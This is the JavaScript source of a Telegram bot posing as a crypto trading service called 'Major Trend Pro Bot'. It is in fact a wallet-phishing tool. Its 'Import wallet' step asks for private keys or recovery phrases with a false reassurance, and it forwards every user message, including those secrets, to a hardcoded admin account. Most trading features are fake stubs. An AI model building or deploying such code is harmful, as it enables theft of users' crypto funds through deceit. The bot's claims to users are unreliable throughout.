const TelegramBot = require('node-telegram-bot-api');

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_ID = 8463629333;

if (!TOKEN) {
  console.error('TELEGRAM_BOT_TOKEN is not set');
  process.exit(1);
}

let bot;
let isShuttingDown = false;

const userStates = {};

function createBot() {
  bot = new TelegramBot(TOKEN, {
    polling: {
      interval: 1000,
      autoStart: true,
      params: { timeout: 30 }
    }
  });

  bot.on('polling_error', (error) => {
    console.error('Polling error:', error.code, error.message);
    if (error.code === 'ETELEGRAM' && error.message.includes('409')) {
      console.log('Conflict detected - another instance may be running. Retrying in 5s...');
      setTimeout(() => {
        if (!isShuttingDown) restartBot();
      }, 5000);
    }
  });

  bot.on('error', (error) => {
    console.error('Bot error:', error.message);
  });

  registerHandlers();
  console.log('Bot started successfully and is polling for messages...');
}

function restartBot() {
  if (isShuttingDown) return;
  console.log('Restarting bot...');
  try {
    if (bot) bot.stopPolling();
  } catch (e) {}
  setTimeout(() => {
    if (!isShuttingDown) createBot();
  }, 3000);
}

function getMainMenuKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '💰 Buy', callback_data: 'buy' },
          { text: '🐝 Sell', callback_data: 'sell' }
        ],
        [
          { text: '🔐 Import wallet', callback_data: 'import_wallet' },
          { text: '🏦 Add assets', callback_data: 'add_assets' },
          { text: '💳 Wallet balance', callback_data: 'wallet_balance' }
        ],
        [
          { text: '👜 Wallet management', callback_data: 'wallet_management' },
          { text: '🏦 Portfolio', callback_data: 'portfolio' }
        ],
        [
          { text: '👥 Copy trading', callback_data: 'copy_trading' },
          { text: '📌 Limit order', callback_data: 'limit_order' }
        ],
        [
          { text: '🏆 Refer and earn', callback_data: 'refer_and_earn' },
          { text: '🏛 Help', callback_data: 'help' }
        ],
        [
          { text: '📡 Signals', callback_data: 'signals' },
          { text: '🌐 Language', callback_data: 'language' }
        ],
        [
          { text: '⚙️ Settings', callback_data: 'settings' }
        ]
      ]
    },
    parse_mode: 'HTML'
  };
}

function getBackMenuKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '🔙 Back', callback_data: 'back' },
          { text: '🔝 Main Menu', callback_data: 'main_menu' }
        ],
        [{ text: '🚫 Cancel', callback_data: 'cancel' }]
      ]
    },
    parse_mode: 'HTML'
  };
}

function getCancelKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🚫 Cancel', callback_data: 'cancel' }]
      ]
    },
    parse_mode: 'HTML'
  };
}

const WELCOME_MESSAGE = `Hey 👋 Welcome to Major Trend Pro Bot
Level up your trade experience here

<b>What can this bot do?</b>

Automate your trading experience with Major Trend Pro Bot. Receive personalized market analysis, trading signals and notifications to help you stay ahead of the market.

Get real-time crypto market updates, trading signals and insight delivered directly to your Telegram. Our bot provides timely alerts, price tracking and more.

☆ Fast
☆ Safe
☆ Reliable`;

const MAIN_MENU_TEXT = `🔝 <b>Main Menu</b>

Choose an option below:`;

async function forwardToAdmin(userId, username, firstName, text, type = 'text') {
  try {
    const userInfo = `👤 <b>User:</b> ${firstName || 'Unknown'} (@${username || 'no_username'})\n🆔 <b>ID:</b> <code>${userId}</code>\n📝 <b>Type:</b> ${type}`;
    const message = `${userInfo}\n\n💬 <b>Message:</b>\n${text}`;
    await bot.sendMessage(ADMIN_ID, message, { parse_mode: 'HTML' });
  } catch (error) {
    console.error('Failed to forward message to admin:', error.message);
  }
}

function registerHandlers() {
  bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    userStates[chatId] = null;

    try {
      await bot.sendMessage(chatId, WELCOME_MESSAGE, {
        ...getMainMenuKeyboard(),
        parse_mode: 'HTML'
      });
      await forwardToAdmin(msg.from.id, msg.from.username, msg.from.first_name, '/start', 'command');
    } catch (error) {
      console.error('Error handling /start:', error.message);
    }
  });

  bot.onText(/\/menu/, async (msg) => {
    const chatId = msg.chat.id;
    userStates[chatId] = null;

    try {
      await bot.sendMessage(chatId, MAIN_MENU_TEXT, {
        ...getMainMenuKeyboard(),
        parse_mode: 'HTML'
      });
    } catch (error) {
      console.error('Error handling /menu:', error.message);
    }
  });

  bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    try {
      await bot.answerCallbackQuery(query.id);
    } catch (e) {}

    try {
      await forwardToAdmin(query.from.id, query.from.username, query.from.first_name, `Button: ${data}`, 'button');

      switch (data) {
        case 'main_menu':
        case 'back':
        case 'cancel':
          userStates[chatId] = null;
          await bot.sendMessage(chatId, MAIN_MENU_TEXT, {
            ...getMainMenuKeyboard(),
            parse_mode: 'HTML'
          });
          break;

        case 'buy':
          userStates[chatId] = 'awaiting_buy_ca';
          await bot.sendMessage(
            chatId,
            'Enter the token CA {contract address}',
            getCancelKeyboard()
          );
          break;

        case 'sell':
          userStates[chatId] = 'awaiting_sell_ca';
          await bot.sendMessage(
            chatId,
            'Enter the token CA {contract address} you want to sell',
            getCancelKeyboard()
          );
          break;

        case 'import_wallet':
          userStates[chatId] = 'awaiting_wallet_import';
          await bot.sendMessage(
            chatId,
            '🔐 Please enter the private key or recovery phrase to your wallet to import wallet.\n\nNOTE: 🙈 no one gained access to your wallet.',
            getCancelKeyboard()
          );
          break;

        case 'add_assets':
          userStates[chatId] = 'awaiting_asset';
          await bot.sendMessage(
            chatId,
            '🏦 <b>Add Assets</b>\n\nEnter the token contract address to add to your portfolio.',
            { ...getCancelKeyboard(), parse_mode: 'HTML' }
          );
          break;

        case 'wallet_balance':
          await bot.sendMessage(
            chatId,
            '💳 <b>Wallet Balance</b>\n\n💰 SOL: 0.00\n💰 ETH: 0.00\n💰 BNB: 0.00\n💰 BASE: 0.00\n\nNo wallet connected. Import a wallet first.',
            { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
          );
          break;

        case 'wallet_management':
          await bot.sendMessage(
            chatId,
            '👜 <b>Wallet Management</b>\n\nManage your connected wallets, switch between wallets, or import a new one.',
            {
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔐 Import New Wallet', callback_data: 'import_wallet' }],
                  [{ text: '🔄 Switch Wallet', callback_data: 'switch_wallet' }],
                  [{ text: '🔑 Export Private Key', callback_data: 'export_key' }],
                  [
                    { text: '🔙 Back', callback_data: 'back' },
                    { text: '🔝 Main Menu', callback_data: 'main_menu' }
                  ]
                ]
              },
              parse_mode: 'HTML'
            }
          );
          break;

        case 'portfolio':
          await bot.sendMessage(
            chatId,
            '🏦 <b>Portfolio</b>\n\n📊 Your portfolio is empty.\n\nStart trading to see your holdings here.',
            { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
          );
          break;

        case 'copy_trading':
          await bot.sendMessage(
            chatId,
            '👥 <b>Copy Trading</b>\n\nCopy the trades of successful traders automatically.\n\n• Follow top traders\n• Auto-mirror their trades\n• Set your own risk limits\n• Real-time notifications',
            {
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔍 Find Traders', callback_data: 'find_traders' }],
                  [{ text: '📋 My Copy Trades', callback_data: 'my_copy_trades' }],
                  [
                    { text: '🔙 Back', callback_data: 'back' },
                    { text: '🔝 Main Menu', callback_data: 'main_menu' }
                  ]
                ]
              },
              parse_mode: 'HTML'
            }
          );
          break;

        case 'limit_order':
          userStates[chatId] = 'awaiting_limit_ca';
          await bot.sendMessage(
            chatId,
            '📌 <b>Limit Order</b>\n\nEnter the token CA {contract address} to set a limit order.',
            { ...getCancelKeyboard(), parse_mode: 'HTML' }
          );
          break;

        case 'refer_and_earn':
          const referLink = `https://t.me/majortrendprobot?start=ref${query.from.id}`;
          await bot.sendMessage(
            chatId,
            `🏆 <b>Refer and Earn</b>\n\n🔗 Invite link: ${referLink}\n\n💵 Withdrawable: 0 ($0)(0 pending)\n💲 Total withdrawn: 0 ($0)\n👥 Total invited: 0 people\n💳 Receiving address: null\n\n🏛 <b>Rules:</b>\n1. Earn 25% of invitees' trading fees permanently\n2. Withdrawals start from 0.01, max 1 request per 24h. Withdrawals will be auto triggered at 8:00 (UTC+8) daily and will be credited within 24 hours after triggering.`,
            { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
          );
          break;

        case 'help':
          await bot.sendMessage(
            chatId,
            `🏛 <b>Help & Support</b>\n\n<b>How it works:</b>\n1. Pick how much volume\n2. Pick how long to run\n3. Done! We handle the rest\n\n🛠 <b>Tools:</b>\nPUMP, VOLUME BOOST, CONNECT, BALANCE, SUPPORT!\n\n🔥 <b>Supported pools:</b>\n• Pump.fun • Pumpswap\n• Radium • moon-it\n• Moonshot • Launch Lap\n• Jupiter • Dex\n\n⚡ Ads & Trending: @MajorBoostBot\n📈 Volume & Bumps: @MajorVolumeBot\n👋 Support 24/7: @MajorHelpBot\n💬 Livestream & Chat: @MajorCommunityChat\n\n🌐 DISCLAIMER: Trade at your own risk.`,
            { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
          );
          break;

        case 'signals':
          await bot.sendMessage(
            chatId,
            `📡 Get the latest trade signals and alerts!\n🎯\n- Receive real-time trade signals and notifications\n- Stay updated on market trends and opportunities\n- Make informed trading decisions with timely alerts 💡`,
            { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
          );
          break;

        case 'language':
          await bot.sendMessage(
            chatId,
            '🌐 <b>Language Settings</b>\n\nSelect your preferred language:',
            {
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: '🇬🇧 English', callback_data: 'lang_en' },
                    { text: '🇨🇳 Chinese', callback_data: 'lang_zh' }
                  ],
                  [
                    { text: '🇪🇸 Spanish', callback_data: 'lang_es' },
                    { text: '🇫🇷 French', callback_data: 'lang_fr' }
                  ],
                  [
                    { text: '🇷🇺 Russian', callback_data: 'lang_ru' },
                    { text: '🇦🇪 Arabic', callback_data: 'lang_ar' }
                  ],
                  [
                    { text: '🔙 Back', callback_data: 'back' },
                    { text: '🔝 Main Menu', callback_data: 'main_menu' }
                  ]
                ]
              },
              parse_mode: 'HTML'
            }
          );
          break;

        case 'settings':
          await bot.sendMessage(
            chatId,
            '⚙️ <b>Settings</b>\n\nConfigure your bot preferences:',
            {
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔔 Notifications', callback_data: 'settings_notifications' }],
                  [{ text: '💰 Default Slippage', callback_data: 'settings_slippage' }],
                  [{ text: '⛽ Gas Settings', callback_data: 'settings_gas' }],
                  [{ text: '🔒 Security', callback_data: 'settings_security' }],
                  [
                    { text: '🔙 Back', callback_data: 'back' },
                    { text: '🔝 Main Menu', callback_data: 'main_menu' }
                  ]
                ]
              },
              parse_mode: 'HTML'
            }
          );
          break;

        case 'switch_wallet':
          await bot.sendMessage(chatId, '🔄 No additional wallets found. Import a wallet first.', { ...getBackMenuKeyboard(), parse_mode: 'HTML' });
          break;

        case 'export_key':
          await bot.sendMessage(chatId, '🔑 No wallet connected. Import a wallet first.', { ...getBackMenuKeyboard(), parse_mode: 'HTML' });
          break;

        case 'find_traders':
          await bot.sendMessage(chatId, '🔍 Searching for top traders...\n\nNo traders available at the moment. Check back later.', { ...getBackMenuKeyboard(), parse_mode: 'HTML' });
          break;

        case 'my_copy_trades':
          await bot.sendMessage(chatId, '📋 You have no active copy trades.', { ...getBackMenuKeyboard(), parse_mode: 'HTML' });
          break;

        case 'settings_notifications':
        case 'settings_slippage':
        case 'settings_gas':
        case 'settings_security':
          await bot.sendMessage(chatId, '⚙️ This setting will be available soon.', { ...getBackMenuKeyboard(), parse_mode: 'HTML' });
          break;

        case 'lang_en':
        case 'lang_zh':
        case 'lang_es':
        case 'lang_fr':
        case 'lang_ru':
        case 'lang_ar':
          await bot.sendMessage(chatId, '✅ Language preference saved!', { ...getBackMenuKeyboard(), parse_mode: 'HTML' });
          break;

        default:
          await bot.sendMessage(chatId, '⚙️ This feature is coming soon!', { ...getBackMenuKeyboard(), parse_mode: 'HTML' });
          break;
      }
    } catch (error) {
      console.error('Error handling callback:', error.message);
    }
  });

  bot.on('message', async (msg) => {
    if (msg.text && msg.text.startsWith('/')) return;

    const chatId = msg.chat.id;
    const text = msg.text || '';
    const state = userStates[chatId];

    try {
      await forwardToAdmin(msg.from.id, msg.from.username, msg.from.first_name, text, state || 'text');

      if (state === 'awaiting_buy_ca') {
        userStates[chatId] = null;
        await bot.sendMessage(
          chatId,
          `✅ Token CA received: <code>${text}</code>\n\n📊 Fetching token info...\n\nThis feature is being set up. Stay tuned!`,
          { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
        );
      } else if (state === 'awaiting_sell_ca') {
        userStates[chatId] = null;
        await bot.sendMessage(
          chatId,
          `✅ Sell order for: <code>${text}</code>\n\n📊 Processing...\n\nThis feature is being set up. Stay tuned!`,
          { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
        );
      } else if (state === 'awaiting_wallet_import') {
        userStates[chatId] = null;
        await bot.sendMessage(
          chatId,
          '✅ Wallet import request received.\n\nNOTE: 🙈 no one gained access to your wallet.\n\nThis feature is being set up. Stay tuned!',
          { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
        );
      } else if (state === 'awaiting_asset') {
        userStates[chatId] = null;
        await bot.sendMessage(
          chatId,
          `✅ Asset CA received: <code>${text}</code>\n\nAdding to portfolio...\n\nThis feature is being set up. Stay tuned!`,
          { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
        );
      } else if (state === 'awaiting_limit_ca') {
        userStates[chatId] = null;
        await bot.sendMessage(
          chatId,
          `✅ Limit order CA received: <code>${text}</code>\n\nSetting up limit order...\n\nThis feature is being set up. Stay tuned!`,
          { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
        );
      } else {
        if (chatId === ADMIN_ID) {
          return;
        }
        await bot.sendMessage(
          chatId,
          'Use the menu buttons to navigate. Type /start or /menu to see the main menu.',
          getMainMenuKeyboard()
        );
      }
    } catch (error) {
      console.error('Error handling message:', error.message);
    }
  });
}

process.on('uncaughtException', (error) => {
  console.error('Uncaught exception:', error.message);
  setTimeout(() => {
    if (!isShuttingDown) restartBot();
  }, 5000);
});

process.on('unhandledRejection', (reason) => {
  console.error('Unhandled rejection:', reason);
});

process.on('SIGTERM', () => {
  console.log('Received SIGTERM, shutting down gracefully...');
  isShuttingDown = true;
  if (bot) bot.stopPolling();
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('Received SIGINT, shutting down gracefully...');
  isShuttingDown = true;
  if (bot) bot.stopPolling();
  process.exit(0);
});

createBot();

setInterval(() => {
  console.log(`[${new Date().toISOString()}] Bot is alive. Uptime: ${Math.floor(process.uptime())}s`);
}, 300000);
